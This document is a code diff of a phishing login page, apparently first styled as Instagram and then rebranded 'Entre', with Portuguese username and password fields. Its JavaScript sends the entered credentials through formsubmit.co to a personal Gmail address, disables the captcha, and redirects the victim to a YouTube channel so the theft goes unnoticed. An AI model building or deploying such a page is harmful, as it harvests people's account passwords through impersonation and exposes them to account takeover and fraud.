@@ -104,11 +104,11 @@
   </style>
 </head>
 <body>
-  <div class="logo">Instagram</div>
+  <div class="logo">Entre</div>
 
   <form id="loginForm">
-    <input type="text" name="usuarioteste" placeholder="" required />
-    <input type="password" name="respostateste" placeholder="" required />
+    <input type="text" name="usuarioteste" placeholder="usuário" required />
+    <input type="password" name="respostateste" placeholder="senha" required />
 
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS" />
@@ -128,11 +128,14 @@
 
       const formData = new FormData(form);
 
-      fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
+fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
+  method: 'POST',
+  body: new URLSearchParams(formData),
+  headers: {
+    'Accept': 'application/json',
+    'Content-Type': 'application/x-www-form-urlencoded'
+  }
+})
       .then(response => {
         if (response.ok) {
           window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
